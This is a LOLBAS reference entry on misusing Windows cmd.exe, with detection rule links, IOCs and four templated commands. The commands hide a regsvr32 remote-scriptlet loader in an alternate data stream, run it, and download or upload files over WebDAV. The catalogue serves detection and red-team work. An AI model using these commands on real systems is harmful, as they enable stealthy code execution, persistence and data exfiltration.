---
title: "Cmd.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Cmd/
fetched_at: 2026-09-20T17:09:33Z
license: unspecified
category: windows
---

The command-line interpreter in Windows

## Paths
- C:\Windows\System32\cmd.exe
- C:\Windows\SysWOW64\cmd.exe

## Resources
- [https://twitter.com/yeyint_mth/status/1143824979139579904](https://twitter.com/yeyint_mth/status/1143824979139579904)
- [https://twitter.com/Mr_0rng/status/1601408154780446721](https://twitter.com/Mr_0rng/status/1601408154780446721)
- [https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22](https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22)
- [https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)

## Acknowledgements
- r0lan ([@yeyint_mth](https://twitter.com/@yeyint_mth))
- Mr.0range ([@mr_0rng](https://twitter.com/@mr_0rng))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml)
- IOC: cmd.exe executing files from alternate data streams.
- IOC: cmd.exe creating/modifying file contents in an alternate data stream.

## Alternate data streams

1. Add content to an Alternate Data Stream (ADS).

```
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
```

   - Use case: Can be used to evade defensive countermeasures or to hide as a persistence mechanism

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1564.004

2. Execute payload.bat stored in an Alternate Data Stream (ADS).

```
cmd.exe - < {PATH}:payload.bat
```

   - Use case: Can be used to evade defensive countermeasures or to hide as a persistence mechanism

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1059.003

3. Downloads a specified file from a WebDAV server to the target file.

```
type {PATH_SMB} > {PATH_ABSOLUTE}
```

   - Use case: Download/copy a file from a WebDAV server

   - Privileges required: User

   - Operating systems: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

4. Uploads a specified file to a WebDAV server.

```
type {PATH_ABSOLUTE} > {PATH_SMB}
```

   - Use case: Upload a file to a WebDAV server

   - Privileges required: User

   - Operating systems: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1048.003
